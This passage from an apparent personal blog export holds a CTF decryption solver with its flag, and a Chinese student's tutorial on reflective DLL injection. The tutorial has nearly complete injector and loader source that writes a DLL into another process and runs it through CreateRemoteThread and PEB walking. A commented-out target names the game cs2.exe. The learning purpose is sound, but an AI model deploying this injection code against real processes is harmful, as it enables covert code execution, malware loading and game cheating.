0x11, 0x0B, 0x17, 0x0A&#125;;unsigned char box1[256] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7, 0x3D, 0x18, 0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4, 0xDE, 0xCA, 0x56, 0x92, 0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3, 0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1, 0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA, 0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1, 0xAA, 0x95, 0x5C, 0x79, 0x72, 0x1C, 0x3F, 0xB8, 0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9, 0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97, 0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B, 0x19, 0xCD, 0xC4, 0x08, 0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76, 0xBF, 0x60, 0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D, 0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F, 0x46, 0xE9, 0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53, 0x83, 0x4D, 0xB2, 0x10, 0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5, 0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94, 0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD, 0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32, 0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A, 0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5, 0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D, 0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98, 0x09, 0x80, 0xE2, 0xC7&#125;;unsigned char sbox1[256];void initsbox1() &#123; for (int i = 0; i &lt; 256; i++) &#123; sbox1[box1[i]] = i; &#125;&#125;char ror(unsigned char a, int i) &#123; return (a &gt;&gt; i) | (a &lt;&lt; (8 - i));&#125;void decrpty0(unsigned char* flag) &#123; for (int i = 0; i &lt; 32; i++) &#123; flag[i] = sbox1[flag[i]]; &#125;&#125;void decrpty1(unsigned char* flag) &#123; char v2[32]; for (int i = 0;i &lt; 32;i++) v2[i] = flag[box2[i]]; for (int i = 0;i &lt; 32;i++) flag[i] = v2[box2[i]];&#125;void decrpty2(unsigned char* flag) &#123; for (int i = 0; i &lt; 32; i++) &#123; flag[i] -= box4[i]; flag[i] ^= box3[i]; &#125;&#125;void decrpty3(unsigned char* flag) &#123; for (int i = 0;i &lt; 32;i++) &#123; flag[i] = ror(flag[i], 5); &#125;&#125;void decrpty(char* flag, int now) &#123; if (now &lt; 0) &#123; if (!strncmp(flag, &quot;flag&quot;, 4)) &#123; printf(&quot;%s&quot;, flag); &#125; return; &#125; for (int i = 0; i &lt; 4; i++) &#123; unsigned char tryflag[33]; memcpy(tryflag, flag, 33); switch (i) &#123; case 0:decrpty0(tryflag);break; case 1:decrpty1(tryflag);break; case 2:decrpty2(tryflag);break; case 3:decrpty3(tryflag);break; &#125; if ((tryflag[now] &amp; 3) == i) &#123; decrpty((char*)tryflag, now - 1); &#125; &#125;&#125;int main() &#123; char flag[] = &#123; 0x65, 0x3E, 0x43, 0xB8, 0xBA, 0xDB, 0xF6, 0x88, 0x25, 0x1B, 0x28, 0xC7, 0xC0, 0x54, 0xA6, 0x4A, 0x90, 0x37, 0xBC, 0x29, 0x41, 0xAA, 0x28, 0xDB, 0x9A, 0x59, 0x63, 0x9E, 0x4B, 0xCF, 0x2E, 0x41, 0 &#125;; initsbox1(); decrpty(flag, 31); //flag&#123;Ea5y_enCrypt_And_decrYpt!!&#125; return 0;&#125;","updated":"2025-10-08T07:37:42.870Z","categories":[{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"}]},{"title":"Dll反射型注入","date":"2024-12-14T07:55:14.000Z","path":"2024/12/14/DLL反射注入blog简洁版/","text":"本篇文章为新生小白学习PE文件之后进行练习所写，肯定会有很多不足之处，欢迎大师傅们点出 原理普通注入先看普通型的注入，如下： 普通的dll注入是在目标进程中开辟一处空间，在空间中写入dll文件的名称，再用LoadLibraryA函数通过查找名称来加载dll，而想在程序里调用LoadLibraryA的话就得用到CreateRemoteThread函数，这个函数传递的参数之一就有函数指针，等到CreateRemoteThread创建新线程之后，就会在新线程中调用这个过度函数，其二的参数就是传给指针的参数 这里插一句，在我多次用x64dbg调试得到的感悟，CreateRemoteThread这个函数，相当于开辟了一个不知道在哪的空间，在这个地方引用你要传入的函数 反射型注入反射型dll注入则是将整个DLL文件传到目标进程的空间中，然后通过CreateRemoteThread调用一段shellcode，将DLL展开，并运行 源码Injectmain123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tlhelp32.h&gt;DWORD RVAtoFileOffset(DWORD rva, PIMAGE_NT_HEADERS pNtHeaders, PIMAGE_SECTION_HEADER pSec);LPVOID GetRemoteReflectLoad(LPVOID pDll, const char* funcName, unsigned char* pBuf);DWORD ProcesstoPid(wchar_t* Processname);BOOL WINAPI MainInject(DWORD dwTargetPid, char* Dllname);int main() &#123; //先定义需要注入的dll与目标进程的名字 //wchar_t szProcName[MAX_PATH] = L&quot;cs2.exe&quot;; wchar_t szProcName[MAX_PATH] = L&quot;pta.exe&quot;; char Dllname[MAX_PATH] = &quot;D:\\\\study\\\\VStudio\\\\ReflectDll\\\\x64\\\\Debug\\\\DLLIN.dll&quot;; //查找获得目标进程的id DWORD dwPid = ProcesstoPid(szProcName); //写入dll文件,这里思考一下，传入的参数都是什么呢？ //因为在这个函数里，我们要做的是将dll文件写入，并且用其中的函数 //dll中的API将会作为参数出现，所以传入的是进程id和dll函数目录 DWORD result = MainInject(dwPid, Dllname);&#125;DWORD ProcesstoPid(wchar_t* Processname) //查找指定进程的PID(Process ID)&#123; HANDLE hProcessSnap = NULL; DWORD ProcessId = 0; PROCESSENTRY32 pe32 = &#123; 0 &#125;; hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //打开进程快照 if (hProcessSnap == (HANDLE)-1) &#123; printf(&quot;\\n[-] CreateToolhelp32Snapshot() Error: %d&quot;, GetLastError()); return 0; &#125; pe32.dwSize = sizeof(PROCESSENTRY32); if (Process32First(hProcessSnap, &amp;pe32)) //开始枚举进程 &#123; do &#123; if (!wcscmp(Processname, pe32.szExeFile)) //判断是否和提供的进程名相等，是，返回进程的ID &#123; ProcessId = pe32.th32ProcessID; break; &#125; &#125; while (Process32Next(hProcessSnap, &amp;pe32)); //继续枚举进程 &#125; else &#123; printf(&quot;\\n[-] Process32First() Error: %d&quot;, GetLastError()); return 0; &#125; if (!ProcessId) printf(&quot;no find&quot;); else printf(&quot;[+] target id is %d&quot;, ProcessId); CloseHandle(hProcessSnap); //关闭系统进程快照的句柄 return ProcessId;&#125;//用于转换RVA-&gt;文件偏移地址//传参说明：第一个是要转换的相对虚拟地址，第二个是Nt头的位置，第三个是节区表头的位置DWORD RVAtoFileOffset(DWORD rva, PIMAGE_NT_HEADERS pNtHeaders, PIMAGE_SECTION_HEADER pSec) &#123; // 遍历节区表 for (int i = 0; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; // 检查RVA是否在当前节区的范围内 if (rva &gt;= pSec[i].VirtualAddress &amp;&amp; rva &lt; pSec[i].VirtualAddress + pSec[i].SizeOfRawData) &#123; // 转换RVA到文件偏移地址 return pSec[i].PointerToRawData + (rva - pSec[i].VirtualAddress); &#125; &#125; // 如果未找到对应的节区，返回无效值 return 0xFFFFFFFF;&#125;//该函数通过分析PE文件头来尝试获取句柄LPVOID GetRemoteReflectLoad(LPVOID pDll, const char* funcName, unsigned char* pBuf) &#123; //这里因为dll在别的进程里，所以想要看到可以利用前面的pBuf //定位一些相关文件头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pBuf + pDosHeader-&gt;e_lfanew); PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNtHeaders + sizeof(IMAGE_NT_HEADERS)); //获取导出表地址及大小，注意这里是RVA DWORD exportDirRVA = pNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress; DWORD exportDirSize = pNtHeaders-&gt;OptionalHeader.DataDirectory[0].Size; //定位导出表 //这里遇到一个小问题，得到的偏移地址是RVA，但是咱们的文件现在只是磁盘文件,所以需要转换 DWORD exportDirFileOffset = RVAtoFileOffset((DWORD)exportDirRVA, pNtHeaders, pSec); //转换之后RVA就变成了文件偏移，然后再定位 PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pBuf + exportDirFileOffset); //解析导出表，这里同理都是RVA DWORD pRNames = pExportDir-&gt;AddressOfNames; DWORD pFNames = RVAtoFileOffset(pRNames, pNtHeaders, pSec); DWORD* pNames = (DWORD*)((BYTE*)pBuf + pFNames); DWORD pRFunctions = pExportDir-&gt;AddressOfFunctions; DWORD pFFunctions = RVAtoFileOffset(pRFunctions, pNtHeaders, pSec); DWORD* pFunctions = (DWORD*)((BYTE*)pBuf + pFFunctions); WORD pRNameOrdinals = pExportDir-&gt;AddressOfNameOrdinals; WORD pFNameOrdinals = RVAtoFileOffset(pRNameOrdinals, pNtHeaders, pSec); WORD* pNameOrdinals = (WORD*)((BYTE*)pBuf + pFFunctions); // 遍历查找目标函数 DWORD funcRVA = 0; for (DWORD i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) &#123; DWORD functionNameRVA = pNames[i]; DWORD functionNameFileOffset = RVAtoFileOffset(functionNameRVA, pNtHeaders, pSec); const char* pName = (char*)((BYTE*)pBuf + functionNameFileOffset); if (strcmp(pName, funcName) == 0) &#123; funcRVA = pFunctions[i]; break; &#125; &#125; if (funcRVA == 0) &#123; printf(&quot;\\n[-] Function %s not found.&quot;, funcName); return NULL; &#125; DWORD fileOffset = RVAtoFileOffset(funcRVA, pNtHeaders, pSec);; DWORD* pfileOffset = (DWORD*)((BYTE*)pBuf + fileOffset); if (fileOffset == 0) &#123; printf(&quot;\\n[-] Failed to convert RVA to file offset.&quot;); return NULL; &#125; LPVOID remoteFuncAddr = (LPBYTE)pDll + fileOffset; return remoteFuncAddr;&#125;BOOL WINAPI MainInject(DWORD dwTargetPid, char* Dllname)&#123; //与普通dll注入一样，首先要做的是获取句柄 HANDLE hProc = NULL; hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPid); if (!hProc) &#123; printf(&quot;\\n[-] OpenProcess Failed.&quot;); DWORD dwError = GetLastError(); printf(&quot;\\n[-] OpenProcess failed. Error code: %d\\n&quot;, dwError); return FALSE; &#125; //有了句柄就可以创建空间然后写入了，这里的写入我参考的是PE加载器中 //ReadFileA与创建空间的方法，其中相当于是在目标进程空间中创造一个&quot;类磁盘&quot;空间 HANDLE hFile = CreateFileA(Dllname, GENERIC_READ, //读取权限 FILE_SHARE_READ | FILE_SHARE_WRITE, //允许其他进程读取文件|允许其他进程写入文件 NULL, //不需要特定的安全性 OPEN_EXISTING, //不需要特定的安全性 FILE_ATTRIBUTE_NORMAL, //如果文件存在，则打开文件。如果文件不存在，操作会失败 NULL //普通文件，没有特殊属性。 ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;\\n[-] CreateFileA failed.&quot;); return FALSE; &#125; DWORD FileSize = GetFileSize(hFile, NULL); LPDWORD SizeToRead = 0; //本地暂存 unsigned char* pBuf = new unsigned char[FileSize]; ZeroMemory(pBuf, FileSize); int result = ReadFile(hFile, pBuf, FileSize, SizeToRead, NULL); //读取文件放在开辟的空间里，pBuf为空间句柄 if (result == 0) &#123; printf(&quot;\\n[-] 文件读取失败&quot;); return FALSE; &#125; //对接下来开辟的空间进行计算大小 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBuf; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pBuf + pDos-&gt;e_lfanew); PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((LPBYTE)pNt + sizeof(IMAGE_NT_HEADERS)); DWORD ImageSize = pNt-&gt;OptionalHeader.SizeOfImage; //开辟目标进程中的&quot;类磁盘&quot;空间，大小为前文的FileSize //这里注意申请的地址权限要是可执行的（PAGE_EXECUTE_READWRITE） //这里创建的时候一下子创两个 //刚开始没发现，才发现，pAlloc应该+的是FileSize哎呀麻烦了我想想 ULONG_PTR TotalSize = ImageSize + ImageSize; printf(&quot;\\n[+] FileSize : %p&quot;, FileSize); printf(&quot;\\n[+] ImageSize: %p&quot;, ImageSize); printf(&quot;\\n[+] TotalSize: %p&quot;, TotalSize); //这里遇到一个问题是，传入的TotaSize大小不够后面节区表的第一个表，好奇怪所以需要修正TotalSize大小 LPVOID pDll = VirtualAllocEx(hProc, NULL, TotalSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (pDll == NULL) &#123; printf(&quot;\\n[-] 内存分配失败, 错误代码: %d&quot;, GetLastError()); return FALSE; &#125; // 清零目标进程内存 SIZE_T sizeToZero = TotalSize; // 需要清零的字节数 BYTE* zeroBuffer = (BYTE*)calloc(sizeToZero, 1); // 创建一个全零的缓冲区 if (zeroBuffer == NULL) &#123; printf(&quot;Failed to allocate zero buffer.\\n&quot;); return -1; &#125; // 写入全零到目标内存 if (!WriteProcessMemory(hProc, pDll, zeroBuffer, sizeToZero, NULL)) &#123; DWORD errorCode = GetLastError(); printf(&quot;WriteProcessMemory failed with error code: %lu\\n&quot;, errorCode); &#125; // 释放缓冲区 free(zeroBuffer); //将dll文件写入进去 if (!WriteProcessMemory(hProc, pDll, pBuf, FileSize, NULL)) &#123; return FALSE; &#125; //接下来的活是找dll文件中相当于loadlibrary函数的自写函数Reflectload //注意前文开辟的&quot;类磁盘&quot;空间中的pDll // 假设 ReflectLoader 是目标函数名 const char* reflectFuncName = &quot;ReflectLoader&quot;; // 获取 ReflectLoader 在目标进程内存中的地址 LPVOID pReflectLoader = GetRemoteReflectLoad(pDll, reflectFuncName, pBuf); if (!pReflectLoader) &#123; printf(&quot;[-] Failed to find ReflectLoader.\\n&quot;); VirtualFreeEx(hProc, pDll, 0, MEM_RELEASE); return FALSE; &#125; LPVOID pAlloc = (LPVOID)((ULONG_PTR)pDll + ImageSize); PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pAlloc + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS)); PIMAGE_SECTION_HEADER pSect = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pDll + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS)); PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNt-&gt;OptionalHeader.DataDirectory[5].VirtualAddress + (ULONG_PTR)pAlloc); printf(&quot;\\n[+] Dll磁盘起始地址:%p&quot;, pDll); printf(&quot;\\n[+] Dll磁盘终止地址:%p&quot;, (ULONG_PTR)pDll + FileSize); printf(&quot;\\n[+] Dll内存起始地址:%p&quot;, pAlloc); printf(&quot;\\n[+] Dll整体结束地址:%p&quot;, (ULONG_PTR)pAlloc + ImageSize); printf(&quot;\\n[+] 磁盘中Nt表头地址:%p&quot;, (ULONG_PTR)pDll + pDos-&gt;e_lfanew); printf(&quot;\\n[+] 内存中Nt表头地址:%p&quot;, (ULONG_PTR)pAlloc + pDos-&gt;e_lfanew); printf(&quot;\\n[+] 磁盘中Sec表头地址:%p&quot;, pSect); printf(&quot;\\n[+] 内存中Sec表头地址:%p&quot;, pSec); printf(&quot;\\n[+] 重定位表基址:%p&quot;, pBaseReloc); printf(&quot;\\n[+] 重定位表RVA:%p&quot;, (ULONG_PTR)pNt-&gt;OptionalHeader.DataDirectory[5].VirtualAddress); DWORD Relco = RVAtoFileOffset((DWORD)pNt-&gt;OptionalHeader.DataDirectory[5].VirtualAddress, pNt, pSection); printf(&quot;\\n[+] 重定位表文件偏移:%p&quot;, (ULONG_PTR)pDll + Relco); //DWORD SecNum = pNt-&gt;FileHeader.NumberOfSections; //for (int i = 0; i &lt; SecNum; i++) &#123; // if (pSection-&gt;SizeOfRawData == 0 || pSection-&gt;PointerToRawData == 0) &#123; // pSection++; // continue; // &#125; // char* chSrcMem = (char*)((ULONG_PTR)pDll + (DWORD)(pSection-&gt;PointerToRawData)); // char* chDestMem = (char*)((ULONG_PTR)pAlloc + (DWORD)(pSection-&gt;PointerToRawData)); // printf(&quot;\\n[+] 磁盘中第%d个节区表对应文件地址:%p&quot;,i, chSrcMem); // printf(&quot;\\n[+] 内存中第%d个节区表对应文件地址:%p&quot;,i, chDestMem); // pSection++; //&#125; printf(&quot;\\n[+] 函数 address:%p&quot;, pReflectLoader); // 调用 ReflectLoader 函数 HANDLE hThread = CreateRemoteThread( hProc, // 目标进程句柄 NULL, // 默认安全属性 0, // 默认堆栈大小 (LPTHREAD_START_ROUTINE)pReflectLoader, // ReflectLoader 地址 pDll, // 参数：DLL 的基址 0, // 默认创建标志 NULL // 不需要线程 ID ); if (!hThread) &#123; printf(&quot;\\n[-] CreateRemoteThread failed: %d&quot;, GetLastError()); VirtualFreeEx(hProc, pDll, 0, MEM_RELEASE); return FALSE; &#125; printf(&quot;\\n[+] ReflectLoader executed successfully.&quot;); // 等待线程执行完成 WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); return TRUE;&#125; ReflectLoader我将一个文件的展开过程分为两部分，一部分是映射文件头和节区段，另一部分是修复重定位表和导入表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;windows.h&gt;#include&lt;stdio.h&gt;#include &lt;stdbool.h&gt;#include &lt;winternl.h&gt;extern &quot;C&quot; __declspec(dllexport) BOOL ReflectLoader(char* pDll);int CompareDllName(wchar_t* dllName, wchar_t* targetDllName);wchar_t* ExtractDllName(const wchar_t* fullDllName);void my_wctomb(char* dest, const wchar_t* src);int CompareStrings(const char* str1, const char* str2);// DLL入口点函数BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; // 弹窗代码 MessageBox(NULL, L&quot;哇塞！！你成功啦！！！&quot;, L&quot;注入程序检测中...&quot;, MB_YESNO | MB_ICONASTERISK); char processName[MAX_PATH] = &#123; 0 &#125;; // 存储进程路径的缓冲区 // 获取当前进程的可执行文件路径 DWORD length = GetModuleFileNameA(NULL, processName, MAX_PATH); MessageBoxA(NULL, processName, &quot;当前进程路径: &quot;, MB_YESNO | MB_ICONASTERISK); Sleep(99999999); return TRUE;&#125;// 自定义的宽字符转普通字符的函数void my_wctomb(char* dest, const wchar_t* src) &#123; while (*src) &#123; if (*src &gt;= L&#x27;A&#x27; &amp;&amp; *src &lt;= L&#x27;Z&#x27;) &#123; *dest = (char)(*src + (L&#x27;a&#x27; - L&#x27;A&#x27;)); // 转换大写字符为小写 &#125; else if (*src &gt;= L&#x27;a&#x27; &amp;&amp; *src &lt;= L&#x27;z&#x27;) &#123; *dest = (char)*src; // 保留小写字符 &#125; else if (*src &gt;= L&#x27;0&#x27; &amp;&amp; *src &lt;= L&#x27;9&#x27;) &#123; *dest = (char)*src; // 保留数字字符 &#125; else &#123; *dest = &#x27;?&#x27;; // 对于其他字符，可以选择替代字符，例如 &#x27;？&#x27; &#125; dest++; src++; &#125; *dest = &#x27;\\0&#x27;; // 确保目标字符串以 null 结尾&#125;int CompareStrings(const char* str1, const char* str2) &#123; while (*str2 != &#x27;\\0&#x27;) &#123; if (*str1 != *str2) &#123; return 0; // 返回差值 &#125; str1++; str2++; &#125; return 1; // 两个字符串完全匹配时返回0&#125;// 比较两个 DLL 名称（大小写不敏感）int CompareDllName(wchar_t* dllName, wchar_t* targetDllName) &#123; size_t i = 0; while (dllName[i] != L&#x27;\\0&#x27; || targetDllName[i] != L&#x27;\\0&#x27;) &#123; // 将两个字符都转换为小写进行比较 wchar_t ch1 = (dllName[i] &gt;= L&#x27;A&#x27; &amp;&amp; dllName[i] &lt;= L&#x27;Z&#x27;) ? dllName[i] + (L&#x27;a&#x27; - L&#x27;A&#x27;) : dllName[i]; wchar_t ch2 = (targetDllName[i] &gt;= L&#x27;A&#x27; &amp;&amp; targetDllName[i] &lt;= L&#x27;Z&#x27;) ? targetDllName[i] + (L&#x27;a&#x27; - L&#x27;A&#x27;) : targetDllName[i]; // 如果字符不同，则返回比较结果 if (ch1 != ch2) &#123; return 0; &#125; i++; &#125; // 如果字符串都没有结束且匹配到最后，返回 0 表示完全相等 return 1; // 如果两个字符串完全相同，返回 0&#125;// 提取 DLL 名称的函数wchar_t* ExtractDllName(const wchar_t* fullDllName) &#123; wchar_t* fileName = NULL; wchar_t* temp = (wchar_t*)fullDllName; // 遍历并找到最后一个 &#x27;\\\\&#x27;，获取文件名部分 while (*temp) &#123; if (*temp == L&#x27;\\\\&#x27;) &#123; fileName = temp + 1; // 更新文件名的位置 &#125; temp++; &#125; // 如果没有找到 &#x27;\\\\&#x27;，则认为整个字符串就是文件名 if (!fileName) &#123; fileName = (wchar_t*)fullDllName; &#125; return fileName;&#125;extern &quot;C&quot; __declspec(dllexport) BOOL ReflectLoader(char* pDll)&#123; //获取磁盘文件的DOS头和NT头 PIMAGE_DOS_HEADER pDOSheader = (PIMAGE_DOS_HEADER)pDll; //赋值DOS头 PIMAGE_NT_HEADERS pNTheader = (PIMAGE_NT_HEADERS)(pDll + pDOSheader-&gt;e_lfanew); //赋值NT头 //给内存分配空间，并对pAlloc进行初始化 DWORD ImageSize = pNTheader-&gt;OptionalHeader.SizeOfImage; //内存空间大小 PBYTE pAlloc = (PBYTE)((ULONG_PTR)pDll + ImageSize); if (pAlloc == NULL) return FALSE; if (pDOSheader-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNTheader-&gt;Signature != IMAGE_NT_SIGNATURE) return FALSE; // 无效的头，直接退出 // 手动实现 CopyMemory 的功能 BYTE* dst = (BYTE*)pAlloc; // 目标内存地址 BYTE* src = (BYTE*)pDll; // 源内存地址 size_t size = pNTheader-&gt;OptionalHeader.SizeOfHeaders; // 需要复制的字节数 for (size_t i = 0; i &lt; size; ++i) &#123; dst[i] = src[i]; // 逐字节复制 &#125; //复制节区表 PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNTheader + sizeof(IMAGE_NT_HEADERS)); DWORD SecNum = pNTheader-&gt;FileHeader.NumberOfSections; for (int i = 0; i &lt; SecNum; i++) &#123; if (pSec-&gt;SizeOfRawData == 0 || pSec-&gt;PointerToRawData == 0) &#123; pSec++; continue; &#125; char* chSrcMem = (char*)((ULONG_PTR)pDll + (DWORD)(pSec-&gt;PointerToRawData)); char* chDestMem = (char*)((ULONG_PTR)pAlloc + (DWORD)(pSec-&gt;VirtualAddress)); DWORD dwSizeOfRawData = pSec-&gt;SizeOfRawData; DWORD dwVirtualSize = pSec-&gt;Misc.VirtualSize; for (DWORD j = 0; j &lt; dwSizeOfRawData; j++) &#123; chDestMem[j] = chSrcMem[j]; &#125; if (dwVirtualSize &gt; dwSizeOfRawData) &#123; char* start = chDestMem + dwSizeOfRawData; char* end = chDestMem + dwVirtualSize; while (start &lt; end) &#123; *start++ = 0; &#125; &#125; pSec++; &#125; //杜哥部分登场 //开始检测并加载重定位表 PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pNTheader-&gt;OptionalHeader.DataDirectory[5].VirtualAddress + (ULONG_PTR)pAlloc); //重定位表指针通过NT结构的数据目录表查找到位置 int SizeOfBaseReloc = pNTheader-&gt;OptionalHeader.DataDirectory[5].Size;//重定位表的大小也在NT结构中 if (pNTheader-&gt;OptionalHeader.DataDirectory[5].VirtualAddress != NULL) &#123; do &#123; PWORD TypeOffset = (WORD*)((PBYTE)pBaseReloc + 8); //跳过前两个元素（不过在有的结构声明中TypeOffset不属于该结构 int num = (pBaseReloc-&gt;SizeOfBlock - 8) / 2; //SizeOfBlock规定的是该单元的大小以及TypeOffset是一字的 for (int i = 0; i &lt; num; i++) &#123; WORD type = TypeOffset[i] &gt;&gt; 12; //TypeOffset[i] &gt;&gt; 12相当于在查找TypeOffset的前四字节（类型） WORD offset = TypeOffset[i] &amp; 0x0FFF; //去掉类型（前四字节） int differ = 0; if (type == 3) &#123; differ = *((ULONG_PTR*)(offset + pBaseReloc-&gt;VirtualAddress + pAlloc)) - pNTheader-&gt;OptionalHeader.ImageBase; ULONG_PTR p = (ULONG_PTR)pAlloc + differ; char* tagetaddr = (char*)(ULONG_PTR)pAlloc + offset + pBaseReloc-&gt;VirtualAddress; char* fromeaddr = (char*)p; for (int c = 0;c &lt; 4;c++) &#123; tagetaddr[c] = fromeaddr[c]; &#125; &#125; &#125; SizeOfBaseReloc -= pBaseReloc-&gt;SizeOfBlock; //通过字节大小来间接表示个数 pBaseReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);//相当于结构指针++了，不过这么看来TypeOffset好像真不属于这个结构 &#125; while (SizeOfBaseReloc); &#125; //导入表的处理 //因为导入表还没有修复，所以里面的API大部分都是无法使用的，可避免的我都去避免了 // 但是是在无法避免的如，LoadLibrary函数无法找到，就需要通过 // TEB和PEB的帮助找到了 //GetProcAddress的地址 typedef FARPROC(WINAPI* GETPROCADDR)(HMODULE, LPCSTR); //LoadLibrary的地址 typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR); GETPROCADDR pGetProcAddress = NULL; LOADLIBRARYA pLoadLibraryA = NULL; //得到TEB的地址，通过TEB找到PEB PTEB pTEB = (PTEB)__readgsqword(0x30); PPEB pPEB = pTEB-&gt;ProcessEnvironmentBlock; // 获取PEB.Ldr PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr; // 遍历模块列表，找到 kernel32.dll PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList; PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink; while (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead) &#123; PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); if (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer) &#123; wchar_t* dllName = pEntry-&gt;FullDllName.Buffer; // 提取 DLL 名称 wchar_t* fileName = ExtractDllName(dllName); // 目标 DLL 名称kernel32.dll wchar_t a[50] = &#123; 0 &#125;; a[0] = L&#x27;k&#x27;; a[1] = L&#x27;e&#x27;; a[2] = L&#x27;r&#x27;; a[3] = L&#x27;n&#x27;; a[4] = L&#x27;e&#x27;; a[5] = L&#x27;l&#x27;; a[6] = L&#x27;3&#x27;; a[7] = L&#x27;2&#x27;; a[8] = L&#x27;.&#x27;; a[9] = L&#x27;d&#x27;; a[10] = L&#x27;l&#x27;; a[11] = L&#x27;l&#x27;; a[12] = L&#x27;\\0&#x27;; if (CompareDllName(fileName, a)) &#123; //分析PE文件找到导出表 HMODULE hKernel32 = (HMODULE)pEntry-&gt;DllBase; PIMAGE_NT_HEADERS pNtHeaders = 